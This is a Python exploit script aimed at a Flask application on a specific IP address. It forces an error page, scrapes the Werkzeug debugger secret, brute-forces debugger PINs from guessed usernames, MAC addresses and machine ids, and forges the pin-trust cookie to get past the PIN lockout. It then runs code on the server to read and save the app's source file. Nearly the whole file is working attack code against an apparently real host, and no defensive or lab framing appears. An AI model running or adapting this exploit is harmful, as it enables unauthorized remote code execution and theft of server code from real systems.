#!/usr/bin/env python3
"""Forge Werkzeug pin-trust cookie and attempt debugger RCE (bypasses pinauth exhausted)."""
from __future__ import annotations

import hashlib
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from itertools import chain

MAIN = "http://43.154.128.116:9110"
PATH = "/api/desktop/decrease-balance"
APP_PY = "/home/试试看洋芋的新的查具体后台/app.py"
HOST = "127.0.0.1:9110"
READ_CMD = f'open("{APP_PY}").read()'


def hash_pin(pin: str) -> str:
    return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]


def pin_and_cookie(public: list, private: list) -> tuple[str, str]:
    h = hashlib.sha1()
    for bit in chain(public, private):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")
    cookie_name = f"__wzd{h.hexdigest()[:20]}"
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]
    pin = "-".join(num[i : i + 3] for i in range(0, 9, 3))
    return pin, cookie_name


def trigger() -> tuple[str, str, str]:
    req = urllib.request.Request(
        MAIN + PATH,
        data=json.dumps({"username": "test", "amount": "NaN"}).encode(),
        method="POST",
        headers={"Content-Type": "application/json"},
    )
    try:
        urllib.request.urlopen(req, timeout=12)
        raise RuntimeError("expected 500")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
    secret = re.search(r'SECRET = "([^"]+)"', body).group(1)
    m = re.search(
        r'id="frame-(\d+)".*?app\.py".*?api_desktop_decrease_balance',
        body,
        re.S,
    )
    frame = m.group(1) if m else re.findall(r'id="frame-(\d+)"', body)[-1]
    return secret, frame, body


def try_exec(secret: str, frame: str, pin: str, cookie_name: str, code: str) -> tuple[int, str]:
    ts = int(time.time())
    cookie_val = f"{ts}|{hash_pin(pin)}"
    cmd = urllib.parse.quote(code, safe="")
    url = f"{MAIN}{PATH}?__debugger__=yes&cmd={cmd}&frm={frame}&s={secret}"
    headers = {"Host": HOST, "Cookie": f"{cookie_name}={cookie_val}"}
    req = urllib.request.Request(url, headers=headers)
    try:
        r = urllib.request.urlopen(req, timeout=15)
        return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def candidates() -> list[tuple[str, str, list, list]]:
    root = "/home/试试看洋芋的新的查具体后台"
    app = root + "/app.py"
    out: list[tuple[str, str, list, list]] = []
    seen: set[str] = set()
    users = ["root", "www-data", "ubuntu", "admin", "flask"]
    mods = [("app", "app", app), ("__main__", "app", app)]
    macs = [0, 1, 2] + list(range(0x000C29000000, 0x000C29000008)) + list(range(0x525400000000, 0x525400000008))
    mids: list = ["", b""]
    for s in ("43.154.128.116", "ubuntu", "TencentOS", "VM-0-16-ubuntu", "ser9hru1dxa5kPw"):
        mids.append(s.encode())
        mids.append(hashlib.md5(s.encode()).hexdigest().encode())

    for user in users:
        for modname, cls, mfile in mods:
            public = [user, modname, cls, mfile]
            for mac in macs:
                for mid in mids:
                    pin, cname = pin_and_cookie(public, [str(mac), mid])
                    if pin in seen:
                        continue
                    seen.add(pin)
                    out.append((pin, cname, public, [str(mac), mid]))
    return out


def main() -> None:
    secret, frame, _ = trigger()
    print(f"secret={secret} frame={frame} candidates={len(candidates())}")

    for i, (pin, cname, pub, priv) in enumerate(candidates()):
        status, body = try_exec(secret, frame, pin, cname, READ_CMD)
        hit = status == 200 and ("@app.route" in body or "Flask" in body or "def " in body)
        if hit or "app.py" in body or len(body) > 500:
            print(f"\n=== [{i}] pin={pin} cookie={cname} status={status} ===")
            print(body[:4000])
            if hit:
                open("/workspace/analysis/leaked_app_rce.py", "w").write(body)
                print("\n[SUCCESS] wrote analysis/leaked_app_rce.py")
                return
        if i % 50 == 0:
            print(f"progress {i}...", flush=True)
        # re-trigger if secret rotated
        if i > 0 and i % 200 == 0:
            secret, frame, _ = trigger()

    print("no RCE hit")


if __name__ == "__main__":
    main()
